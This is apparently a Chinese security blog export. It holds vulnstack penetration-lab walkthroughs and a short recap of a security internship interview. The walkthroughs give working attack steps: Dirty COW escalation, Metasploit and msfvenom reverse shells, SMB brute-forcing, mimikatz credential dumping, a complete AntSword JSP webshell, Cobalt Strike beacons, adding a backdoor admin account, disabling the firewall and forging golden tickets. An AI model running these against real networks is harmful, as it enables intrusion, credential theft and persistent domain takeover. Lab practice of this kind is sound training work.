<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ens33     Link encap:Ethernet  HWaddr 00:0c:29:ab:32:ac  </span><br><span class="line">          inet addr:192.168.93.120  Bcast:192.168.93.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:feab:32ac&#x2F;64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:145075 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:86884 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:17884352 (17.8 MB)  TX bytes:24388894 (24.3 MB)</span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1&#x2F;128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:380140 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:380140 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1 </span><br><span class="line">          RX bytes:28142732 (28.1 MB)  TX bytes:28142732 (28.1 MB)</span><br></pre></td></tr></table></figure>

<p>使用蚁剑访问下/home 和 /tmp文件下内容 ，发现/tmp/mysql/test.txt，内容为下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adduser sswwwuser</span><br><span class="line">passwd wwwuser_123Aqx</span><br></pre></td></tr></table></figure>

<p><code>uname -a </code>查看内核版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>

<p><code>cat /etc/passwd</code> 查看用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">syslog:x:104:108::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">lxd:x:106:65534::&#x2F;var&#x2F;lib&#x2F;lxd&#x2F;:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:107:111::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:108:112::&#x2F;run&#x2F;uuidd:&#x2F;bin&#x2F;false</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;bin&#x2F;false</span><br><span class="line">yy:x:1000:1000:yy,,,:&#x2F;home&#x2F;yy:&#x2F;bin&#x2F;bash</span><br><span class="line">sshd:x:110:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:111:117:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">www:x:1001:1001::&#x2F;home&#x2F;www:&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure>

<p><code>netstat -ano</code> 查看开放端口，看到开放了22 80和3306</p>
<p>尝试刚才在tmp中找到的账号登录ssh，成功登录</p>
<p><code>ssh wwwuser@192.168.3.42 -p 22</code>  <code>wwwuser_123Aqx</code></p>
<p><img src="/posts/2ce9ab7f/ssh_login.png"></p>
<p>查看ip时发现和蚁剑shell上的ip不同，是另一台机器，应该使用到的是nginx反向代理</p>
<h4 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h4><p>使用脏牛提权</p>
<p>下载地址:<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
<p>将dirty.c上传到蚁剑 使用wget下载</p>
<p><img src="/posts/2ce9ab7f/wget_dirtyc.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line"></span><br><span class="line">.&#x2F;dirty test123</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/dirtycow.png"></p>
<p>成功提权为firefart权限</p>
<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="上线MSF"><a href="#上线MSF" class="headerlink" title="上线MSF"></a>上线MSF</h4><p>使用exploit/multi/script/web_delivery</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">set target 7    # 选择目标系统 可以show targets 查看 7是linux</span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.3.43  # kali的ip</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/msf_web_delivery.png"><br>复制payload到目标机器运行，得到反弹shell<br><img src="/posts/2ce9ab7f/msf_web_delivery2.png"></p>
<hr>
<p>当然也可以用msfvenom生成shell</p>
<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.42 LPORT=4444 -f elf &gt; shell.elf</code></p>
<p>使用蚁剑上传，然后再centos机器上下载shell</p>
<p><code>wget  http://192.168.3.42/templates/beez3/shell.elf</code></p>
<p><code>chmod +x shell.elf</code></p>
<p>在kali上开启监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lhost kali的ip</span><br><span class="line">lhost &#x3D;&gt; 192.168.3.43</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lport 4444</span><br><span class="line">lport &#x3D;&gt; 4444</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure>

<h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><p><code> use post/multi/manage/autoroute</code></p>
<p><img src="/posts/2ce9ab7f/autoroute.png"></p>
<h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><p><code>use auxiliary/server/socks_proxy</code></p>
<p><code>sudo vim /etc.proxychains4.conf</code> 修改为 socks 127.0.0.1</p>
<h4 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h4><h5 id="利用icmp协议探测存活主机"><a href="#利用icmp协议探测存活主机" class="headerlink" title="利用icmp协议探测存活主机"></a>利用icmp协议探测存活主机</h5><p><code>for k in $( seq 1 255);do ping -c 1 192.168.93.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done</code> 扫到5台存活主机</p>
<p><img src="/posts/2ce9ab7f/icmp.png"></p>
<h5 id="smb扫描"><a href="#smb扫描" class="headerlink" title="smb扫描"></a>smb扫描</h5><p><code>use auxiliary/scanner/smb/smb_version</code></p>
<p><code> set rhosts 192.168.93.0/24</code></p>
<p><code>set thread 10</code></p>
<p><code>run</code></p>
<p>扫到3台windows机器</p>
<p><img src="/posts/2ce9ab7f/smb_10.png"></p>
<p><img src="/posts/2ce9ab7f/smb_20.png"></p>
<p><img src="/posts/2ce9ab7f/smb_30.png"></p>
<p>所以域内的5台主机都可以确定了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.93.10	windows 2012</span><br><span class="line">192.168.93.20	windows 2008</span><br><span class="line">192.168.93.30	windows 7	</span><br><span class="line">192.168.93.100  centos</span><br><span class="line">192.168.93.120  ubuntu(nginx反向代理)</span><br></pre></td></tr></table></figure>

<h4 id="内网主机端口探测"><a href="#内网主机端口探测" class="headerlink" title="内网主机端口探测"></a>内网主机端口探测</h4><p>使用nmap扫描一下内网中的3台windows主机开放的端口.</p>
<p><code>proxychains4 nmap 192.168.93.10 -Pn -sT -sV -F</code></p>
<p><img src="/posts/2ce9ab7f/nmap_10.png"></p>
<p>同样的方法扫一下20 30 主机</p>
<p><img src="/posts/2ce9ab7f/nmap_20.png"></p>
<p><img src="/posts/2ce9ab7f/nmap_30.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.93.10     80.135.139.445          win2012</span><br><span class="line">192.168.93.20     80,135,139,445,1433     win2008R2</span><br><span class="line">192.168.93.30     135,139,445             win7</span><br></pre></td></tr></table></figure>

<h4 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><p>使用ms17-010扫一波漏洞</p>
<p><code>use /scanner/smb/smb_ms17_010</code></p>
<p><img src="/posts/2ce9ab7f/ms17-010.png"></p>
<p>没有发现漏洞</p>
<h4 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h4><p>先爆破一下win2008R2主机的mssql smb</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_login</span><br><span class="line">set rhosts 192.168.93.20</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set PASS_FILE &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;PASSWORD_top1000.txt</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>自己跑没跑出密码了….看了其他师傅跑出来的密码是<code>123qwe!ASD</code></p>
<h4 id="使用wmi连接shell"><a href="#使用wmi连接shell" class="headerlink" title="使用wmi连接shell"></a>使用wmi连接shell</h4><p><code>proxychains4 python2 wmiexec.py  &#39;administrator:123qwe!ASD@192.168.93.20&#39;</code></p>
<p>成功连接20主机的shell</p>
<p><img src="/posts/2ce9ab7f/wmiexec_shell_20.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br><span class="line">tasklist -V</span><br><span class="line">net view </span><br><span class="line">net view &#x2F;domain</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">域控是192.168.93.10 </span><br><span class="line">域内有三台机器  \\WIN-8GA56TNV3MV                                                              </span><br><span class="line">                \\WIN2008                                                                      </span><br><span class="line">                \\WIN7    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="使用smbclient上传mimikatz"><a href="#使用smbclient上传mimikatz" class="headerlink" title="使用smbclient上传mimikatz"></a>使用smbclient上传mimikatz</h4><p><code>proxychains4 smbclient //192.168.93.20/C$ -U administrator</code></p>
<p><img src="/posts/2ce9ab7f/smbclient.png"></p>
<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.log</code></p>
<p><img src="/posts/2ce9ab7f/logonpasswords.png"></p>
<p>得到域控账号密码 <code>Administrator</code>   <code>zxcASDqw123!!</code></p>
<h4 id="使用ipc连接域控"><a href="#使用ipc连接域控" class="headerlink" title="使用ipc连接域控"></a>使用ipc连接域控</h4><p><code>net use \\192.168.93.10\ipc$ zxcASDqw123!! /user:&quot;TEST\Administrator&quot;</code></p>
<p><img src="/posts/2ce9ab7f/ipc_flag.png"></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack2靶场</title>
    <url>/posts/8a9ea0cb/</url>
    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>统一登录密码 <code>1qaz@WSX</code></p>
<p>Web密码错误的，在快照管理器里面选择转到1.3即可,默认为空，然后修改密码为统一密码</p>
<p>然后再web主机上开启Weblogic服务</p>
<p><img src="/posts/8a9ea0cb/start_weblogic.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dc    仅主机  10.10.10.10</span><br><span class="line">web   仅主机  10.10.10.80   NAT 192.168.0.80</span><br><span class="line">pc    仅主机  10.10.10.201  NAT 192.168.0.201</span><br><span class="line">kali  NAT     192.168.0.128</span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h4><p>用kaliping不通web主机，应该是开启了防火墙禁止了icmp</p>
<p><code>sudo nmap 192.168.0.80 -sV</code></p>
<blockquote>
<p>PORT      STATE SERVICE       VERSION<br>80/tcp    open  http          Microsoft IIS httpd 7.5<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br>1433/tcp  open  ms-sql-s      Microsoft SQL Server 2008 R2 10.50.4000; SP2<br>3389/tcp  open  ms-wbt-server Microsoft Terminal Service<br>7001/tcp  open  http          Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)<br>49152/tcp open  msrpc         Microsoft Windows RPC<br>49153/tcp open  msrpc         Microsoft Windows RPC<br>49154/tcp open  msrpc         Microsoft Windows RPC<br>49155/tcp open  msrpc         Microsoft Windows RPC<br>49156/tcp open  msrpc         Microsoft Windows RPC</p>
</blockquote>
<p><img src="/posts/8a9ea0cb/nmap.png"></p>
<p>先从7001的weblogic下手，使用WeblogicScan扫描一下是否存在漏洞</p>
<p><img src="/posts/8a9ea0cb/weblogicscan.png"></p>
<p>得到后台路径为<code>http://192.168.0.80:7001/console/login/LoginForm.jsp</code></p>
<p>检测到存在<code>CVE20192725</code> 和 ssrf漏洞</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="利用ssrf漏洞进行端口探测"><a href="#利用ssrf漏洞进行端口探测" class="headerlink" title="利用ssrf漏洞进行端口探测"></a>利用ssrf漏洞进行端口探测</h4><p>存在位置<code>http://192.168.0.80:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
<p>抓包测试</p>
<p><img src="/posts/8a9ea0cb/ssrf1.png"></p>
<p>此处的operator为可控点，输入一个存在的端口<code>127.0.0.1:7001</code> 会返回一个状态码</p>
<p><img src="/posts/8a9ea0cb/ssrf_7001.png"></p>
<p>输入一个不存在的端口时<code>192.168.0.80:1234</code> 会返回<code>but could not connect over HTTP to server</code></p>
<p><img src="/posts/8a9ea0cb/ssrf_1234.png"></p>
<p>输入<code>127.0.0.1:6379</code> 返回<code>but could not connect over HTTP to server</code>说明没有开放6379端口，没法继续利用去弹redis shell</p>
<p><img src="/posts/8a9ea0cb/ssrf_6379.png"></p>
<p><a href="https://www.cnblogs.com/bmjoker/p/9759761.html">weblogic ssrf利用</a></p>
<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>直接使用6哥师傅的java反序列化终极测试工具.</p>
<p><img src="/posts/8a9ea0cb/java_tool1.png"></p>
<p><img src="/posts/8a9ea0cb/java_tool2.png"></p>
<p><a href="https://www.cnblogs.com/sstfy/p/10350915.html">weblogic上传木马时路径选择</a></p>
<p>1.把shell写到控制台images目录中</p>
<p><code>C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</code></p>
<p>访问<code>http://*.*.*.*:7001/console/framework/skins/wlsconsole/images/shell.jsp</code></p>
<p>2.写到uddiexplorer目录中</p>
<p><code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\随机字符\war\shell.jsp</code></p>
<p>访问<code>http://*.*.*.*:7001/uddiexplorer/shell.jsp</code></p>
<p>3.写到应用安装目录中</p>
<p><code>C:\Oracle\Middleware\user_projects\domains\application\servers\AdminServer\tmp\_WL_user\项目名\随机字符\war\shell.jsp</code></p>
<p>访问<code>http://*.*.*.*:7001/项目名/shell.jsp</code></p>
<p>上传蚁剑的jsp马。密码为ant</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder &#x3D; clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls &#x3D; request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls !&#x3D; null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/8a9ea0cb/uploade_shell.png"></p>
<p>使用蚁剑进行连接</p>
<p><img src="/posts/8a9ea0cb/ant_conn.png"></p>
<p>然后可以使用<code>As-Exploits</code>插件</p>
<p>发现该机器上有安装360</p>
<h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>在CS上创建listener 生成cs.exe后使用蚁剑运行，beacon成功上线</p>
<p><img src="/posts/8a9ea0cb/cs1.png"></p>
<h5 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前用户sid  shell whoami &#x2F;user</span><br><span class="line">查看系统信息  shell systeminfo</span><br><span class="line">查看域名      shell net config workstation</span><br><span class="line">查看域内用户  shell net user &#x2F;domain</span><br><span class="line">查看机器信息  net computers </span><br><span class="line">查看域内主机  shell net view</span><br><span class="line">查看有几个域  shell net view &#x2F;domain</span><br><span class="line">查看域管理员  shell net group &quot;domain admins&quot; &#x2F;domain  </span><br><span class="line">查看域控      shell net group &quot;domain controllers&quot; &#x2F;domain  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>shell whoami /user</code></p>
<p><img src="/posts/8a9ea0cb/cs_whoami_user.png"></p>
<p><code>shell systeminfo</code></p>
<p><img src="/posts/8a9ea0cb/cs_systeminfo.png"></p>
<p><code>shell net config workstation</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_config_workstation.png"></p>
<p><code>shell net user /domain</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_user_domain.png"></p>
<p><code>net computers</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_computers.png"></p>
<p>使用CS的portscan模块扫描域内主机端口</p>
<p><img src="/posts/8a9ea0cb/cs_portscan.png"></p>
<p>关闭防火墙<code>netsh advfirewall set allprofiles state off</code></p>
<p><code>shell net view </code> 发现报错6118，在网上查了下是因为没有开启<code>Computer Brower</code>服务，去看了下，web服务器把该服务禁止了，开启后就可以正常使用了（因为刚才是的时候web服务器密码登录不上去，然后切换了快照，手动开启了web服务）</p>
<p><img src="/posts/8a9ea0cb/cs_net_view.png"></p>
<p><code>shell net group &quot;domain admins&quot; /domain</code></p>
<p><code>shell net group &quot;domain controllers&quot; /domain </code></p>
<p><img src="/posts/8a9ea0cb/cs_shell_net_group.png"></p>
<p>使用CS的<code>run_mimikatz</code>模块</p>
<p><img src="/posts/8a9ea0cb/cs_run_mimikatz.png"></p>
<p>得到凭据信息，密码为<code>1qaz@WSX</code></p>
<p><img src="/posts/8a9ea0cb/cs_credentials.png"></p>
<h4 id="创建用户登录3389"><a href="#创建用户登录3389" class="headerlink" title="创建用户登录3389"></a>创建用户登录3389</h4><p>查看3389是否开放</p>
<p><img src="/posts/8a9ea0cb/cs_nerstat_3389.png"></p>
<p><img src="/posts/8a9ea0cb/cs_new_user.png"></p>
<p>添加用户到管理员权限 <code>shell net localgroup administrators Mamor /add</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_localgroup_administrators_Mamor_add.png"></p>
<p><code>sudo rdesktop 192.168.0.80:3389 </code> 使用 <code>Mamor</code> <code>1qaz@WSX</code>成功登录</p>
<p><img src="/posts/8a9ea0cb/rdesktop.png"></p>
<p>(注：这里的360防护好像没有起作用，没有进行拦截)</p>
<h4 id="使用PSexec横向移动"><a href="#使用PSexec横向移动" class="headerlink" title="使用PSexec横向移动"></a>使用PSexec横向移动</h4><p>使用和上一个靶场一样的方法，创建一个smb监听器</p>
<p>在Targets中 选择主机右键jump-&gt; psexec，选择票据</p>
<p>然后得到如图，可以通过这种方法得到web机器的system权限</p>
<p><img src="/posts/8a9ea0cb/cs_graph_view.png"></p>
<p>成功拿到域控DC.</p>
<h4 id="CS派生MSF"><a href="#CS派生MSF" class="headerlink" title="CS派生MSF"></a>CS派生MSF</h4><p>在CS中创建一个 Foreign HTTP listener</p>
<p><img src="/posts/8a9ea0cb/cs_msf.png"></p>
<p>在msf中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf exploit(multi&#x2F;handler) &gt;  set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set &#x3D;&gt; payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.0.128</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.128</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lport 6666</span><br><span class="line">lport &#x3D;&gt; 6666</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="/posts/8a9ea0cb/cs_msf_shell.png"></p>
<p>msf添加路由</p>
<p><img src="/posts/8a9ea0cb/msf_autoroute.png"></p>
<p><img src="/posts/8a9ea0cb/route_print.png"></p>
<p>配置代理，在proxychains4设置127.0.0.1 1080</p>
<p><img src="/posts/8a9ea0cb/socks_proxy.png"></p>
<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><h5 id="域控信息收集"><a href="#域控信息收集" class="headerlink" title="域控信息收集"></a>域控信息收集</h5><p>在域控获取krbtgt账户的NTLM hash值和SID</p>
<p><img src="/posts/8a9ea0cb/dc_hashdump.png"></p>
<p><code>82dfc71b72a11ef37d663047bc2088fb</code></p>
<p><img src="/posts/8a9ea0cb/dc_logonpasswords.png"></p>
<p>SID <code>S-1-5-21-2756371121-2868759905-3853650604</code></p>
<h5 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h5><p>黄金票据时伪造票据授予票据(TGT)</p>
<p>利用需要的条件:</p>
<p>1.域名称</p>
<p>2.域的SID值</p>
<p>3.域的KRBTGT账户NTLM密码哈希</p>
<p>4.伪造用户名</p>
<p>使用CS清除client端(域内其他机器)的票据</p>
<p><code>kerberos_ticket_purge</code></p>
<p><code>shell klist</code>查看票据信息是否已经被清除</p>
<p><img src="/posts/8a9ea0cb/cs_shell_kilist.png"></p>
<p>使用CS生成黄金票据</p>
<p><img src="/posts/8a9ea0cb/cs_Golden_Ticket.png"></p>
<p><img src="/posts/8a9ea0cb/cs_Golden_Ticket2.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次长亭安全研究员实习生面试的经历</title>
    <url>/posts/e38ec14f/</url>
    <content><![CDATA[<p>前言:这个是在boss上hr昨天联系的我，然后今天下午通知我晚上进行面试…说的主要是研究比赛之类的，我说这个我不是很擅长，然后就尝试一下吧</p>
<hr>
<p>1.自我介绍</p>
<p>2.个人规划</p>
<p>3.近期参加的比赛，得过什么成绩吗</p>
<p>4.你认为什么是一道优秀的题目</p>
<p>回答的主要意思就是希望题目更贴近于实际环境</p>
<p>5.时间盲注用到的函数有哪些？如果sleep被禁用了还有什么函数可以替代</p>
<p>if sleep substr ，问sleep的替代函数时没想到，之前没接触过然后查了下是<code>benchmark</code></p>
<p>6.什么是二次注入</p>
<p>第一次注入后数据中存在脏数据，然后再次调用时没有对存在脏数据的数据进行检测，执行了数据库命令，从而使造成了数据库的注入</p>
<p>7.了解反序列化吗，说一下反序列化漏洞的原理</p>
<p>反序列化就是将字符数据转换为对象进行存储，然后再反序列化的</p>
<p>之前接触过shiro反序列化，fastjosn，weblogic</p>
<p>拿shiro反序列化举例子，shiro的RememberMe字段的值会先进行序列化，然后再进行AES加密，在进行base64加密。相对的，解密过程则是先对RememberMe的值进行base64解密，AES解密，反序列化。那么可以将构造恶意代码的语句放到Shiro的Cookie RememberMe中，被shiro服务器进行解析时，会进行反序列化，最后恶意代码会被执行从而造成反序列化漏洞。</p>
<p>8.说一下你印象较深的题目</p>
<p>我说了下之前4月份有接触过ssti，但是问我ssti的原理的时候就想不出来了…(在不正确使用模板引擎进行渲染时，会造成模板注入)</p>
<p>9.XSS分类，说一下弹xss的语句有哪些?</p>
<p>反射型，存储型，DOM型</p>
<p>然后我就说了可以用script JavaScript frame 之类的，然后师傅让我说下具体的写法，然后就简单说了下，师傅说这样写的话大多数是无法执行的</p>
<p>10.csrf和ssrf哪个危害更大一些？ssrf该如何防御</p>
<p>ssrf可以内容读取，探测内网；csrf可以盗取cookie，然后我说应该是csrf吧（虽然知道他们的作用，但是还是拿不定主意）然后师傅有问了下才确定是ssrf危害大。</p>
<p>然后问ssrf如何防御</p>
<p>11.泄漏类题目有接触过吗，接触过哪些</p>
<p>当时只想到了git泄漏，面试完突然想到了svn泄漏和DS_store泄漏</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.hg源码泄漏</span><br><span class="line">.git源码泄露</span><br><span class="line">.DS_Store泄漏</span><br><span class="line">svn泄漏</span><br></pre></td></tr></table></figure>

<p>12.有什么问题要提问吗</p>
